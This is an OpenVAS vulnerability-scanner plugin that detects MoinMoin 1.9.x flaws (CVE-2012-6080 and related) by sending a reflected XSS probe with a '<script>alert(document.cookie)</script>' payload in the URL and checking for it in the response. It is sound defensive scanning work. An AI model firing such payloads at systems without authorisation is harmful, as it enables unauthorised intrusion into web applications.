###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_moinmoin_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# MoinMoin Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary
  HTML or web script in a user's browser session in the context of an affected
  site, uplaod malicious script and overwrite arbitrary files via directory
  traversal sequences.
  Impact Level: Application";

tag_affected = "MoinMoin version 1.9.x prior to 1.9.6";
tag_insight = "Multiple flaws due to,
  - Certain input when handling the AttachFile action is not properly verified
    before being used to write files.
  - The application allows the upload of files with arbitrary extensions to a
    folder inside the webroot when handling the twikidraw or anywikidraw
    actions.
  - Input passed via page name in rss link is not properly sanitised before
    being displayed to the user.";
tag_solution = "Update to MoinMoin 1.9.6 or later,
  For updates refer to http://moinmo.in/MoinMoinDownload";
tag_summary = "This host is installed with MoinMoin and is prone to multiple
  vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803445";
CPE = "cpe:/a:moinmo:moinmoin";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2012-6080", "CVE-2012-6081", "CVE-2012-6082", "CVE-2012-6495");
  script_bugtraq_id(57076, 57082, 57089, 57147);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-21 15:03:34 +0530 (Thu, 21 Mar 2013)");
  script_name("MoinMoin Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.com/88826");
  script_xref(name : "URL" , value : "http://www.osvdb.com/88827");
  script_xref(name : "URL" , value : "http://www.osvdb.com/88828");
  script_xref(name : "URL" , value : "http://moinmo.in/SecurityFixes");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51663");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2012/12/29/6");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2012/12/30/6");

  script_description(desc);
  script_summary("Check if MoinMoin is vulnerable to XSS vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_moinmoin_wiki_detect.nasl");
  script_mandatory_keys("moinmoinWiki/installed");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";

## Get HTTP Port
if(!port = get_app_port(cpe: CPE, nvt: SCRIPT_OID)){
  port = 8080;
}

## Check port state
if(!get_port_state(port)){
  exit(0);
}

## Get Location
if(!dir = get_app_location(cpe: CPE, nvt: SCRIPT_OID, port: port)){
  exit(0);
}

## Construct the url
url = string(dir, 'MoinMoin/theme/__init__.py/"<script>alert(document.cookie)</script>');

## Confirm exploit worked properly or not
if(http_vuln_check(port: port, url: url, pattern: "<script>alert\(document.cookie\)</script>"))
{
  security_hole(port: port);
  exit(0);
}
